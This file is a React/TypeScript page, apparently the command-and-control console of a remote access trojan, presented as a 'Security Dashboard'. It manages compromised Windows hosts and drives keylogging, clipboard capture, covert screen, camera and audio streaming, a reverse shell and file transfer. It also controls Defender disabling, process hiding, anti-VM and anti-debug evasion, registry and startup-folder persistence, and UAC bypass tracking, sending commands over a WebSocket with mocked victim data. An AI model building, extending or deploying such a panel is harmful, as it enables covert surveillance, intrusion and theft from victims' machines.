import { useEffect, useMemo, useState } from "react";
import { useWebSocket } from "@/hooks/useWebSocket";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuLabel,
  DropdownMenuRadioGroup,
  DropdownMenuRadioItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import DoughnutChart from "@/components/charts/DoughnutChart";
import TrendLineChart from "@/components/charts/TrendLineChart";
import ActiveAgentsCard from "@/components/dashboard/ActiveAgentsCard";
import ConfigStatusCard from "@/components/dashboard/ConfigStatusCard";
import PasswordManagementCard from "@/components/dashboard/PasswordManagementCard";
import FilterToolbar from "@/components/dashboard/FilterToolbar";
import StreamingControlPanel from "@/components/streaming/StreamingControlPanel";
import SecurityControlPanel from "@/components/security/SecurityControlPanel";
import PersistenceControlPanel from "@/components/persistence/PersistenceControlPanel";
import MonitoringControlPanel from "@/components/monitoring/MonitoringControlPanel";
import FileTransferPanel from "@/components/filetransfer/FileTransferPanel";
import Navigation from "@/components/ui/navigation";
import TerminalPanel from "@/components/terminal/TerminalPanel";
import ProcessListPanel from "@/components/processes/ProcessListPanel";
import SystemInfoPanel from "@/components/system/SystemInfoPanel";
import NetworkPanel from "@/components/network/NetworkPanel";
import KeyloggerPanel from "@/components/monitoring/KeyloggerPanel";
import ClipboardMonitorPanel from "@/components/monitoring/ClipboardMonitorPanel";
import VoiceControlPanel from "@/components/monitoring/VoiceControlPanel";
import ReverseShellPanel from "@/components/monitoring/ReverseShellPanel";
import EnhancedWebRTCPanel from "@/components/streaming/EnhancedWebRTCPanel";
import EnhancedFileTransferPanel from "@/components/filetransfer/EnhancedFileTransferPanel";
import type { Agent, DashboardMetrics } from "@/types/dashboard";

// Small helper to update meta for SEO
const setMeta = (name: string, content: string) => {
  let el = document.querySelector(`meta[name="${name}"]`);
  if (!el) {
    el = document.createElement("meta");
    el.setAttribute("name", name);
    document.head.appendChild(el);
  }
  el.setAttribute("content", content);
};

const categories = [
  {
    key: "auth",
    label: "Authentication & Security",
    description:
      "Admin Settings: Manage passwords, session timeouts, max login attempts. Security Evasion: Disable Defender, hide processes, anti-VM/anti-debug.",
  },
  {
    key: "stream",
    label: "Streaming & Communication",
    description:
      "WebRTC Stream control with codecs, ABR, frame dropping. Status & Logs for server and streaming connection.",
  },
];

const checks = [
  {
    key: "agent",
    label: "Agent & System Health Checks",
  },
  {
    key: "webrtc",
    label: "WebRTC Streaming Checks",
  },
  {
    key: "server",
    label: "Controller & Server Checks",
  },
];

const ranges = [
  { key: "1h", label: "Last Hour" },
  { key: "24h", label: "Last 24 Hours" },
  { key: "7d", label: "Last 7 Days" },
  { key: "custom", label: "Custom Range" },
];

const Index = () => {
  const [category, setCategory] = useState("auth");
  const [check, setCheck] = useState("agent");
  const [range, setRange] = useState("24h");
  const [bypassView, setBypassView] = useState<'persistence' | 'uac'>("persistence");
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [activePanel, setActivePanel] = useState<string | null>(null);
  const [activeView, setActiveView] = useState("overview");

  // WebSocket connection for real-time updates
  const { isConnected, lastMessage, sendMessage } = useWebSocket('ws://localhost:8080/ws');

  // Mock agent data - in real implementation, this would come from WebSocket
  const [agents, setAgents] = useState<Agent[]>([
    {
      id: "agent-001",
      hostname: "DESKTOP-ABC123",
      ip: "192.168.1.100",
      os: "Windows 11 Pro",
      status: "online",
      lastSeen: "2024-01-15T14:35:00Z",
      capabilities: ["screen", "camera", "audio", "keylogger", "clipboard"],
      streams: { screen: true, camera: false, audio: true },
      persistence: { registry: true, startup: true, scheduledTasks: false, services: true },
      security: { defenderDisabled: true, avDisabled: false, processHidden: true, antiVm: true, antiDebug: true },
    },
    {
      id: "agent-002",
      hostname: "LAPTOP-XYZ789",
      ip: "192.168.1.101",
      os: "Windows 10 Pro",
      status: "online",
      lastSeen: "2024-01-15T14:34:30Z",
      capabilities: ["screen", "audio", "keylogger"],
      streams: { screen: false, camera: false, audio: false },
      persistence: { registry: false, startup: true, scheduledTasks: true, services: false },
      security: { defenderDisabled: false, avDisabled: true, processHidden: false, antiVm: false, antiDebug: true },
    },
    {
      id: "agent-003",
      hostname: "SERVER-DEF456",
      ip: "192.168.1.102",
      os: "Windows Server 2022",
      status: "offline",
      lastSeen: "2024-01-15T13:45:00Z",
      capabilities: ["screen", "camera", "audio", "keylogger", "clipboard"],
      streams: { screen: false, camera: false, audio: false },
      persistence: { registry: true, startup: false, scheduledTasks: true, services: true },
      security: { defenderDisabled: true, avDisabled: true, processHidden: true, antiVm: true, antiDebug: true },
    },
  ]);

  // File transfer data
  const [fileTransfers, setFileTransfers] = useState([
    {
      id: "1",
      filename: "document.pdf",
      size: 2048576,
      progress: 75,
      status: "uploading" as const,
      agentId: "agent-001",
      startTime: "2024-01-15T14:30:00Z",
    },
    {
      id: "2", 
      filename: "screenshot.png",
      size: 1024000,
      progress: 100,
      status: "completed" as const,
      agentId: "agent-002",
      startTime: "2024-01-15T14:25:00Z",
    },
  ]);

  // SEO setup
  useEffect(() => {
    document.title = "Neural Control Hub – Security Dashboard";
    setMeta("description", "Realtime security, streaming and controller status dashboard with interactive charts.");
  }, []);

  // WebSocket message handling
  useEffect(() => {
    if (lastMessage) {
      try {
        const data = JSON.parse(lastMessage);
        // Handle different message types
        console.log("WebSocket message:", data);
      } catch (e) {
        console.error("Error parsing WebSocket message:", e);
      }
    }
  }, [lastMessage]);

  // Agent control handlers
  const handleStreamToggle = (agentId: string, type: string, action: string) => {
    sendMessage(JSON.stringify({
      type: 'stream_control',
      agent_id: agentId,
      stream_type: type,
      action: action
    }));
  };

  const handleSecurityAction = (agentId: string, action: string, params?: any) => {
    sendMessage(JSON.stringify({
      type: 'security_control',
      agent_id: agentId,
      action: action,
      params: params
    }));
  };

  const handlePersistenceAction = (agentId: string, method: string, action: string, params?: any) => {
    sendMessage(JSON.stringify({
      type: 'persistence_control',
      agent_id: agentId,
      method: method,
      action: action,
      params: params
    }));
  };

  const handleMonitoringAction = (agentId: string, type: string, action: string, params?: any) => {
    sendMessage(JSON.stringify({
      type: 'monitoring_control',
      agent_id: agentId,
      monitor_type: type,
      action: action,
      params: params
    }));
  };

  const handleFileAction = (agentId: string, action: string, params?: any) => {
    sendMessage(JSON.stringify({
      type: 'file_control',
      agent_id: agentId,
      action: action,
      params: params
    }));
  };

  // Computed metrics
  const onlineAgents = agents.filter(agent => agent.status === 'online');
  const totalAgents = agents.length;

  // Chart data
  const agentReport = useMemo(() => [
    { label: "Critical", value: 8, color: "hsl(var(--chart-1))" },
    { label: "Warning", value: 15, color: "hsl(var(--chart-2))" },
    { label: "Info", value: 7, color: "hsl(var(--chart-3))" },
  ], []);

  const connectionStatus = useMemo(() => [
    { label: "Online", value: onlineAgents.length, color: "hsl(var(--chart-1))" },
    { label: "Recently Active", value: 1, color: "hsl(var(--chart-2))" },
    { label: "Offline", value: totalAgents - onlineAgents.length - 1, color: "hsl(var(--chart-3))" },
  ], [onlineAgents.length, totalAgents]);

  const persistenceMethods = useMemo(() => [
    { label: "Registry", value: 3, color: "hsl(var(--chart-1))" },
    { label: "Startup", value: 2, color: "hsl(var(--chart-2))" },
    { label: "Services", value: 2, color: "hsl(var(--chart-3))" },
    { label: "Tasks", value: 1, color: "hsl(var(--chart-4))" },
  ], []);

  const uacBypass = useMemo(() => [
    { label: "Success", value: 4, color: "hsl(var(--chart-1))" },
    { label: "Failed", value: 2, color: "hsl(var(--chart-2))" },
    { label: "Pending", value: 1, color: "hsl(var(--chart-3))" },
  ], []);

  const trendData = useMemo(() => 
    Array.from({ length: 30 }).map((_, i) => ({
      name: `Day ${i + 1}`,
      Security: Math.floor(Math.random() * 40) + 60,
      Identity: Math.floor(Math.random() * 30) + 70,
      Network: Math.floor(Math.random() * 25) + 75,
      Service: Math.floor(Math.random() * 20) + 80,
    })), []
  );

  // Controller realtime metrics
  const [controllerData, setControllerData] = useState(() =>
    Array.from({ length: 20 }).map((_, i) => ({
      name: `${i}`,
      Latency: 40 + Math.round(Math.random() * 20),
      Agents: 40 + Math.round(Math.random() * 5),
      Service: 95 + Math.round(Math.random() * 3),
    }))
  );

  useEffect(() => {
    const id = setInterval(() => {
      setControllerData((prev) => {
        const next = {
          name: `${Number(prev[prev.length - 1].name) + 1}`,
          Latency: Math.max(25, Math.min(120, (prev[prev.length - 1].Latency + (Math.random() * 10 - 5)) | 0)),
          Agents: Math.max(35, Math.min(60, (prev[prev.length - 1].Agents + (Math.random() * 2 - 1)) | 0)),
          Service: Math.max(90, Math.min(100, (prev[prev.length - 1].Service + (Math.random() * 2 - 1)) | 0)),
        };
        const arr = [...prev.slice(-19), next];
        return arr;
      });
    }, 1500);
    return () => clearInterval(id);
  }, []);

  // Filter previews mimic same colors & style
  const filterPreviewDonut = (
    <div className="w-64">
      <DoughnutChart data={agentReport} totalLabel="Items" />
    </div>
  );

  const filterPreviewLine = (
    <div className="w-72">
      <TrendLineChart
        data={trendData}
        series={[
          { dataKey: "Security", name: "Security", colorIndex: 0 },
          { dataKey: "Identity", name: "Identity", colorIndex: 1 },
        ]}
      />
    </div>
  );

  const handleLogout = () => {
    window.location.href = '/logout';
  };

  const renderOverviewDashboard = () => (
    <section className="container mx-auto p-6 space-y-8">
      <FilterToolbar
        category={category}
        setCategory={setCategory}
        check={check}
        setCheck={setCheck}
        range={range}
        setRange={setRange}
        categories={categories}
        checks={checks}
        ranges={ranges}
      />

      <div className="grid gap-6 md:grid-cols-12">
        <div className="md:col-span-12 lg:col-span-3">
          <Card className="h-full">
            <CardHeader>
              <CardTitle className="flex items-center justify-between">
                Active Agents
                <Badge variant={isConnected ? "default" : "destructive"}>
                  {isConnected ? "Connected" : "Disconnected"}
                </Badge>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              {agents.length === 0 ? (
                <div className="rounded-lg border border-border bg-muted/20 p-6 text-center text-sm text-muted-foreground">
                  No agents connected
                </div>
              ) : (
                <div className="space-y-2">
                  {agents.map((agent) => (
                    <div key={agent.id} className="flex items-center justify-between p-2 border rounded">
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <div className={`w-2 h-2 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
                          <span className="font-medium text-sm">{agent.hostname}</span>
                        </div>
                        <div className="text-xs text-muted-foreground">{agent.ip} • {agent.os}</div>
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => {
                          setSelectedAgent(agent.id);
                          setActiveView('streaming');
                        }}
                        disabled={agent.status !== 'online'}
                      >
                        Control
                      </Button>
                    </div>
                  ))}
                </div>
              )}
              <div className="grid gap-2">
                <Button
                  variant="secondary"
                  className="justify-start font-medium"
                  style={{ backgroundImage: "var(--gradient-primary)" }}
                  onClick={() => setActiveView('system-info')}
                >
                  Agent Stats
                </Button>
                <Button 
                  variant="secondary" 
                  className="justify-start bg-muted/30"
                  onClick={() => setActiveView('network')}
                >
                  System Health
                </Button>
                <Button 
                  variant="secondary" 
                  className="justify-start bg-muted/30"
                  onClick={() => setActiveView('processes')}
                >
                  List Processes
                </Button>
                <Button 
                  variant="secondary" 
                  className="justify-start bg-muted/30"
                  onClick={() => window.location.reload()}
                >
                  Refresh Dashboard
                </Button>
              </div>
              <Separator />
            </CardContent>
          </Card>
        </div>

        <Card className="relative md:col-span-6 lg:col-span-3">
          <CardHeader>
            <CardTitle>Agent Report Status</CardTitle>
          </CardHeader>
          <CardContent>
            <DoughnutChart data={agentReport} totalLabel="Total Issues" />
          </CardContent>
        </Card>

        <Card className="md:col-span-6 lg:col-span-3">
          <CardHeader>
            <CardTitle>Agent Connection Status</CardTitle>
          </CardHeader>
          <CardContent>
            <DoughnutChart data={connectionStatus} totalLabel="Total Agents" />
          </CardContent>
        </Card>

        <Card className="md:col-span-12 lg:col-span-3">
          <CardHeader>
            <CardTitle>Bypass Status</CardTitle>
          </CardHeader>
          <CardContent>
            <Tabs value={bypassView} onValueChange={(v) => setBypassView(v as any)}>
              <TabsList className="grid w-full grid-cols-2 mb-4">
                <TabsTrigger value="persistence">Persistence Methods</TabsTrigger>
                <TabsTrigger value="uac">UAC Bypass Methods</TabsTrigger>
              </TabsList>
              <TabsContent value="persistence" className="mt-0">
                <DoughnutChart data={persistenceMethods} totalLabel="Active Methods" />
              </TabsContent>
              <TabsContent value="uac" className="mt-0">
                <DoughnutChart data={uacBypass} totalLabel="Attempts" />
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Best Practice Checks Trending</CardTitle>
        </CardHeader>
        <CardContent>
          <TrendLineChart
            data={trendData}
            series={[
              { dataKey: "Security", name: "Security", colorIndex: 0 },
              { dataKey: "Identity", name: "Identity", colorIndex: 1 },
              { dataKey: "Network", name: "Network", colorIndex: 2 },
              { dataKey: "Service", name: "Service Setup", colorIndex: 3 },
            ]}
          />
        </CardContent>
      </Card>

      <div className="grid gap-6 md:grid-cols-12">
        <Card className="md:col-span-12 lg:col-span-9">
          <CardHeader>
            <CardTitle>Controller Status (Realtime)</CardTitle>
          </CardHeader>
          <CardContent>
            <TrendLineChart
              data={controllerData}
              series={[
                { dataKey: "Latency", name: "Latency (ms)", colorIndex: 0 },
                { dataKey: "Agents", name: "Online Agents", colorIndex: 1 },
                { dataKey: "Service", name: "Service Health %", colorIndex: 3 },
              ]}
            />
          </CardContent>
        </Card>
        <div className="md:col-span-12 lg:col-span-3 grid gap-6">
          <ConfigStatusCard />
          <PasswordManagementCard />
        </div>
      </div>
    </section>
  );

  const renderAgentManagement = () => (
    <section className="container mx-auto p-6 space-y-6">
      <div className="grid gap-6 md:grid-cols-12">
        <div className="md:col-span-12">
          <Card>
            <CardHeader>
              <CardTitle>Agent Management</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid gap-4">
                {agents.map((agent) => (
                  <div key={agent.id} className="flex items-center justify-between p-4 border rounded-lg">
                    <div className="flex items-center gap-4">
                      <div className={`w-3 h-3 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
                      <div>
                        <div className="font-medium">{agent.hostname}</div>
                        <div className="text-sm text-muted-foreground">{agent.ip} • {agent.os}</div>
                        <div className="text-xs text-muted-foreground">Last seen: {new Date(agent.lastSeen).toLocaleString()}</div>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="flex gap-1">
                        {agent.capabilities.map((cap) => (
                          <Badge key={cap} variant="secondary" className="text-xs">
                            {cap}
                          </Badge>
                        ))}
                      </div>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => {
                          setSelectedAgent(agent.id);
                          setActiveView('streaming');
                        }}
                        disabled={agent.status !== 'online'}
                      >
                        Control
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </section>
  );

  const renderStreamingControls = () => (
    <section className="container mx-auto p-6">
      {selectedAgent ? (
        <StreamingControlPanel
          agentId={selectedAgent}
          streams={{
            screen: { active: true, bitrate: 2500, fps: 30, resolution: "1920x1080" },
            camera: { active: false, bitrate: 0, fps: 0, resolution: "640x480" },
            audio: { active: true, bitrate: 128, sampleRate: 44100 }
          }}
          onStreamToggle={(type, action) => handleStreamToggle(selectedAgent, type, action)}
        />
      ) : (
        <Card>
          <CardContent className="p-8 text-center">
            <p className="text-muted-foreground">Please select an agent to control streaming</p>
          </CardContent>
        </Card>
      )}
    </section>
  );

  const renderSecurityControls = () => (
    <section className="container mx-auto p-6">
      {selectedAgent ? (
        <SecurityControlPanel
          agentId={selectedAgent}
          security={agents.find(a => a.id === selectedAgent)?.security || {
            defenderDisabled: false,
            avDisabled: false,
            processHidden: false,
            antiVm: false,
            antiDebug: false
          }}
          onSecurityAction={(action, params) => handleSecurityAction(selectedAgent, action, params)}
        />
      ) : (
        <Card>
          <CardContent className="p-8 text-center">
            <p className="text-muted-foreground">Please select an agent to control security features</p>
          </CardContent>
        </Card>
      )}
    </section>
  );

  const renderPersistenceControls = () => (
    <section className="container mx-auto p-6">
      {selectedAgent ? (
        <PersistenceControlPanel
          agentId={selectedAgent}
          persistence={{
            registry: { active: true, count: 3, entries: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Agent"] },
            startup: { active: true, count: 1, entries: ["C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\agent.exe"] },
            scheduledTasks: { active: false, count: 0, entries: [] },
            services: { active: true, count: 1, entries: ["GhostService"] }
          }}
          onPersistenceAction={(method, action, params) => handlePersistenceAction(selectedAgent, method, action, params)}
        />
      ) : (
        <Card>
          <CardContent className="p-8 text-center">
            <p className="text-muted-foreground">Please select an agent to control persistence methods</p>
          </CardContent>
        </Card>
      )}
    </section>
  );

  const renderMonitoringControls = () => (
    <section className="container mx-auto p-6">
      {selectedAgent ? (
        <MonitoringControlPanel
          agentId={selectedAgent}
          monitoring={{
            keylogger: { active: true, keyCount: 1247, lastActivity: "2024-01-15T14:35:20Z" },
            clipboard: { active: true, clipCount: 23, lastClipboard: "https://example.com/secret" },
            reverseShell: { active: false, commandCount: 0, lastCommand: "" },
            voiceControl: { active: false, commandCount: 0, lastCommand: "" }
          }}
          onMonitoringAction={(type, action, params) => handleMonitoringAction(selectedAgent, type, action, params)}
        />
      ) : (
        <Card>
          <CardContent className="p-8 text-center">
            <p className="text-muted-foreground">Please select an agent to control monitoring features</p>
          </CardContent>
        </Card>
      )}
    </section>
  );

  const renderFileTransfer = () => (
    <section className="container mx-auto p-6">
      {selectedAgent ? (
        <FileTransferPanel
          agentId={selectedAgent}
          transfers={fileTransfers}
          onFileAction={(action, params) => handleFileAction(selectedAgent, action, params)}
        />
      ) : (
        <Card>
          <CardContent className="p-8 text-center">
            <p className="text-muted-foreground">Please select an agent to manage file transfers</p>
          </CardContent>
        </Card>
      )}
    </section>
  );

  const renderActiveView = () => {
    switch (activeView) {
      case "overview":
        return renderOverviewDashboard();
      case "agents":
        return renderAgentManagement();
      case "terminal":
        return (
          <section className="container mx-auto p-6">
            <TerminalPanel agentId={selectedAgent} />
          </section>
        );
      case "processes":
        return (
          <section className="container mx-auto p-6">
            <ProcessListPanel agentId={selectedAgent} />
          </section>
        );
      case "system-info":
        return (
          <section className="container mx-auto p-6">
            <SystemInfoPanel agentId={selectedAgent} />
          </section>
        );
      case "network":
        return (
          <section className="container mx-auto p-6">
            <NetworkPanel agentId={selectedAgent} />
          </section>
        );
      case "monitor-keylogger":
        return (
          <section className="container mx-auto p-6">
            <KeyloggerPanel agentId={selectedAgent} />
          </section>
        );
      case "monitor-clipboard":
        return (
          <section className="container mx-auto p-6">
            <ClipboardMonitorPanel agentId={selectedAgent} />
          </section>
        );
      case "monitor-voice":
        return (
          <section className="container mx-auto p-6">
            <VoiceControlPanel agentId={selectedAgent} />
          </section>
        );
      case "monitor-shell":
        return (
          <section className="container mx-auto p-6">
            <ReverseShellPanel agentId={selectedAgent} />
          </section>
        );
      case "webrtc-advanced":
        return (
          <section className="container mx-auto p-6">
            <EnhancedWebRTCPanel agentId={selectedAgent} />
          </section>
        );
      case "streaming":
        return renderStreamingControls();
      case "security":
        return renderSecurityControls();
      case "persistence":
        return renderPersistenceControls();
      case "monitoring":
        return renderMonitoringControls();
      case "files":
        return renderFileTransfer();
      case "files-advanced":
        return (
          <section className="container mx-auto p-6">
            <EnhancedFileTransferPanel agentId={selectedAgent} />
          </section>
        );
      default:
        return renderOverviewDashboard();
    }
  };

  return (
    <main className="min-h-screen bg-background">
      <Navigation
        activeView={activeView}
        onViewChange={setActiveView}
        selectedAgent={selectedAgent}
        agentCount={totalAgents}
        onlineCount={onlineAgents.length}
        onLogout={handleLogout}
      />
      {renderActiveView()}
    </main>
  );
};

export default Index;
